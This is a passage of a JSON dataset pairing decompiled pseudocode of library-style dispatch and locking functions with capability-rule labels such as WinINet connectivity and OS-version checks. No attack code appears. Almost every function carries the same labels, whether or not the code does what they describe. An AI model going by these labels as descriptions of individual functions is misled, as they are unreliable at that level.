        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000746e0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000749b0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x34) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x34) != 0)) {\n            var_4h = (**(**arg_8h + 0x34))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 296
    },
    "000747b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000747b0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000749b0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x38) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x38) != 0)) {\n            var_4h = (**(**arg_8h + 0x38))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 296
    },
    "00074880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00074880(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.000748f0(arg_8h, arg_ch, arg_10h);\n    if (var_ch == 0x21590001) {\n        arg_ch_00 = fcn.00075de0(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            var_ch = fcn.00074550(arg_8h, arg_ch_00, var_4h, arg_10h);\n            fcn.000357f0(arg_ch_00);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 201
    },
    "000748f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000748f0(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000749b0(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x3c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x3c) != 0)) {\n            var_4h = (**(**arg_8h + 0x3c))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 277
    },
    "000749b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000749b0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00034a10(0x800cdc18);\n    iVar1 = fcn.0006d2c0(arg_8h, 1);\n    if (iVar1 == 0) {\n        var_4h = 0x21590065;\n    }\n    else if (*(*arg_8h + 0x14) == 0) {\n        fcn.00036f70(*arg_8h + 4);\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    fcn.00034a80(0x800cdc18);\n    return var_4h;\n}\n",
        "token_count": 186
    },
    "00074aa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00074aa0(int32_t **arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar2;\n    char *pcVar3;\n    uint uVar4;\n    uint var_2ch;\n    uint var_24h;\n    char *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uchar *var_4h;\n    \n    *arg_8h = NULL;\n    var_ch = 0;\n    while( true ) {\n        if (*(arg_ch + var_ch * 4) == 0) {\n            return 0x21590005;\n        }\n        arg_8h_00 = fcn.00035820(*(arg_ch + var_ch * 4));\n        if (arg_8h_00 == NULL) {\n            return 0x21590004;\n        }\n        var_4h = fcn.00078a44(arg_8h_00, 0x2e);\n        if (var_4h != NULL) {\n            *var_4h = 0;\n            var_4h = var_4h + 1;\n        }\n        pcVar3 = arg_8h_00;\n        uVar4 = arg_20h;\n        var_1ch = fcn.00075cf0(arg_8h_00);\n        if (var_1ch == 0) {\n            fcn.000357f0(arg_8h_00);\n            var_18h = 0x21590005;\n            if (*0x800da9d0 != 0) {\n                if (arg_24h == 0) {\n                    var_18h = (**(*0x800da9d0 + 0xc))(arg_8h, *(arg_ch + var_ch * 4), arg_10h, arg_14h, arg_20h);\n                }\n                else {\n                    var_18h = (**(*0x800da9d0 + 0x10))\n                                        (arg_8h, *(arg_ch + var_ch * 4), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, \n                                         pcVar3, uVar4);\n                }\n                if (var_18h == 0) {\n                    var_1ch = *0x800da9d0;\n                }\n            }\n        }\n        else {\n            if (var_4h == NULL) {\n                var_20h = arg_8h_00;\n                do {\n                    cVar1 = *var_20h;\n                    var_20h = var_20h + 1;\n                } while (cVar1 != '\\0');\n                var_14h = var_20h - (arg_8h_00 + 1);\n            }\n            else {\n                var_14h = var_4h - arg_8h_00;\n            }\n            fcn.000357f0(arg_8h_00);\n            if (arg_24h == 0) {\n                var_18h = (**(var_1ch + 0xc))(arg_8h, *(arg_ch + var_ch * 4) + var_14h, arg_10h, arg_14h, arg_20h);\n            }\n            else {\n                var_18h = (**(var_1ch + 0x10))\n                                    (arg_8h, *(arg_ch + var_ch * 4) + var_14h, arg_10h, arg_14h, arg_18h, arg_1ch, \n                                     arg_20h);\n            }\n        }\n        if (var_1ch != 0) break;\n        var_ch = var_ch + 1;\n    }\n    if (var_18h != 0) {\n        return var_18h;\n    }\n    if (*arg_8h != NULL) {\n        arg_8h_01 = fcn.000356c0(0x20);\n        if (arg_8h_01 == NULL) {\n            (**(var_1ch + 0x14))(*arg_8h, 0);\n            (**(var_1ch + 0x18))(*arg_8h, 0);\n            *arg_8h = NULL;\n            return 0x21590004;\n        }\n        *arg_8h_01 = var_1ch;\n        arg_8h_01[5] = 0;\n        arg_8h_01[6] = 0;\n        fcn.00036ed0(arg_8h_01 + 1);\n        fcn.000349b0(arg_8h_01 + 7);\n        **arg_8h = arg_8h_01;\n        iVar2 = fcn.0006d170(*arg_8h, 4);\n        if (iVar2 != 0) {\n            return 0;\n        }\n        fcn.00036f40(arg_8h_01 + 1);\n        fcn.000349e0(arg_8h_01 + 7);\n        fcn.000357f0(arg_8h_01);\n        (**(var_1ch + 0x14))(*arg_8h, 0);\n        (**(var_1ch + 0x18))(*arg_8h, 0);\n        *arg_8h = NULL;\n        return 0x21590004;\n    }\n    (**(var_1ch + 0x14))(*arg_8h, 0);\n    (**(var_1ch + 0x18))(*arg_8h, 0);\n    return -1;\n}\n",
        "token_count": 1347
    },
    "00074dc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00074dc0(int32_t **arg_8h, uint arg_ch)\n\n{\n    int32_t **arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *arg_8h;\n    fcn.00034a10(0x800cdc1c);\n    iVar1 = fcn.0006d2c0(arg_8h_00, 4);\n    if (iVar1 == 0) {\n        fcn.00034a80(0x800cdc1c);\n        *arg_8h = NULL;\n    }\n    else {\n        arg_8h_01 = *arg_8h_00;\n        if (arg_8h_01[5] == 0) {\n            arg_8h_01[5] = 1;\n            fcn.00034a80(0x800cdc1c);\n            (**(**arg_8h_00 + 0x14))(arg_8h_00, arg_ch);\n            fcn.00037100(arg_8h_01 + 1);\n            fcn.00034a10(0x800cdc1c);\n            *arg_8h = NULL;\n            fcn.0006d200(arg_8h_00, 4);\n            fcn.00034a80(0x800cdc1c);\n            (**(**arg_8h_00 + 0x18))(arg_8h_00, arg_ch);\n            fcn.00037190(arg_8h_01 + 1);\n            fcn.00036f40(arg_8h_01 + 1);\n            fcn.000349e0(arg_8h_01 + 7);\n            fcn.000357f0(arg_8h_01);\n        }\n        else {\n            fcn.00034a80(0x800cdc1c);\n            *arg_8h = NULL;\n        }\n    }\n    return;\n}\n",
        "token_count": 459
    },
    "00074ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074ed0(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00075960(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x1c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x1c) != 0)) {\n            var_4h = (**(**arg_8h + 0x1c))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 276
    },
    "00074f90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074f90(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00075960(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x20) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x20) != 0)) {\n            var_4h = (**(**arg_8h + 0x20))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 273
    },
    "00075050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00075050(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00075960(arg_8h);\n    if (iVar1 == 0) {\n        if (((**arg_8h + 0x24) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x24) != 0)) {\n            var_4h = (**(**arg_8h + 0x24))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if (var_4h == 0) {\n                var_4h = fcn.00076ff0(arg_ch, arg_10h, arg_14h, arg_18h);\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    else {\n        var_4h = fcn.00076ff0(arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return var_4h;\n}\n",
        "token_count": 315
    },
    "00075120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00075120(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00075960(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x28) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x28) != 0)) {\n            var_4h = (**(**arg_8h + 0x28))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 294
    },
    "000751f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000751f0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00075960(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x2c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x2c) != 0)) {\n            var_4h = (**(**arg_8h + 0x2c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 298
    },
    "000752c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000752c0(int32_t **arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = fcn.0006d2c0(arg_8h, 4);\n    if ((iVar2 != 0) && (arg_ch != 0)) {\n        piVar1 = *arg_8h;\n        fcn.00034a10(piVar1 + 7);\n        if (0 < piVar1[6]) {\n            piVar1[6] = piVar1[6] + -1;\n            fcn.00034a80(piVar1 + 7);\n            (**(**arg_8h + 0x30))(arg_8h, arg_ch);\n            fcn.00037020(*arg_8h + 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "00075340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00075340(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00075960(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x34) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x34) != 0)) {\n            var_4h = (**(**arg_8h + 0x34))(arg_8h, arg_ch, arg_10h, arg_14h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 283
    },
    "00075400": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00075400(int32_t **arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.00075960(arg_8h);\n    if (var_8h == 0) {\n        if (((**arg_8h + 0x38) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x38) != 0)) {\n            var_8h = (**(**arg_8h + 0x38))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_8h == 0) && (*arg_ch != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034a10(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.00034a80(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_8h = 0x21590006;\n                }\n                fcn.00037020(*arg_8h + 1);\n                *arg_ch = 0;\n                *arg_10h = 0;\n            }\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_8h = 0x21590001;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 404
    },
    "00075510": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00075510(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00075580(arg_8h, arg_ch, arg_10h);\n    if (var_ch == 0x21590001) {\n        arg_ch_00 = fcn.00075de0(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            var_ch = fcn.00075340(arg_8h, arg_ch_00, var_4h, arg_10h);\n            fcn.000357f0(arg_ch_00);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 200
    },
    "00075580": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00075580(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00075960(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x3c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x3c) != 0)) {\n            var_4h = (**(**arg_8h + 0x3c))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 275
    },
    "00075640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00075640(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00075960(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x40) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x40) != 0)) {\n            var_4h = (**(**arg_8h + 0x40))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 294
    },
    "00075710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00075710(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00075790(arg_8h, arg_ch, arg_10h, arg_14h);\n    if (var_ch == 0x21590001) {\n        arg_ch_00 = fcn.00075de0(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            var_ch = fcn.00075640(arg_8h, arg_ch_00, var_4h, arg_10h, arg_14h);\n            fcn.000357f0(arg_ch_00);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 216
    },
    "00075790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00075790(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00075960(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x44) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x44) != 0)) {\n            var_4h = (**(**arg_8h + 0x44))(arg_8h, arg_ch, arg_10h, arg_14h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 283
    },
    "00075850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00075850(int32_t **arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = fcn.00075960(arg_8h);\n    if (var_8h == 0) {\n        if (((**arg_8h + 0x48) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x48) != 0)) {\n            var_8h = (**(**arg_8h + 0x48))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            if ((var_8h == 0) && (*arg_ch != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034a10(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.00034a80(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_8h = 0x21590006;\n                }\n                fcn.00037020(*arg_8h + 1);\n                *arg_ch = 0;\n                *arg_10h = 0;\n            }\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_8h = 0x21590001;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 415
    },
    "00075960": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00075960(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00034a10(0x800cdc1c);\n    iVar1 = fcn.0006d2c0(arg_8h, 4);\n    if (iVar1 == 0) {\n        var_4h = 0x21590065;\n    }\n    else if (*(*arg_8h + 0x14) == 0) {\n        fcn.00036f70(*arg_8h + 4);\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    fcn.00034a80(0x800cdc1c);\n    return var_4h;\n}\n",
        "token_count": 187
    },
    "000759d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00075aed)\n// WARNING: Removing unreachable block (ram,0x00075afa)\n// WARNING: Removing unreachable block (ram,0x00075afc)\n// WARNING: Removing unreachable block (ram,0x00075b15)\n// WARNING: Removing unreachable block (ram,0x00075b24)\n// WARNING: Removing unreachable block (ram,0x00075b0c)\n// WARNING: Removing unreachable block (ram,0x00075b3a)\n// WARNING: Removing unreachable block (ram,0x00075b4c)\n// WARNING: Removing unreachable block (ram,0x00075b43)\n// WARNING: Removing unreachable block (ram,0x00075b68)\n// WARNING: Removing unreachable block (ram,0x00075b73)\n// WARNING: Removing unreachable block (ram,0x00075b79)\n// WARNING: Removing unreachable block (ram,0x00075b9c)\n\nuint __cdecl fcn.000759d0(char *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_2ch;\n    uint var_24h;\n    char *var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    iVar2 = fcn.00037400(0x800da9d4);\n    if (iVar2 < 2) {\n        fcn.0006d0e0();\n        iVar2 = *0x800b90bc;\n        for (var_18h = 0; *(iVar2 + var_18h * 0xc) != 0; var_18h = var_18h + 1) {\n            iVar3 = (**(*(iVar2 + 8 + var_18h * 0xc) + 4))();\n            if (iVar3 != 0) {\n                for (var_10h = 0; var_10h < var_18h; var_10h = var_10h + 1) {\n                    (**(*(iVar2 + 8 + var_10h * 0xc) + 8))();\n                }\n                return 0x21590007;\n            }\n        }\n        var_4h = arg_8h;\n        while ((var_4h != NULL && (*var_4h != '\\0'))) {\n            var_20h = var_4h;\n            do {\n                cVar1 = *var_20h;\n                var_20h = var_20h + 1;\n                var_4h = var_20h;\n            } while (cVar1 != '\\0');\n        }\n        fcn.00073cc0();\n        fcn.00075e90();\n        fcn.00077150();\n        fcn.00074a20();\n    }\n    return 0;\n}\n",
        "token_count": 663
    },
    "00075bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
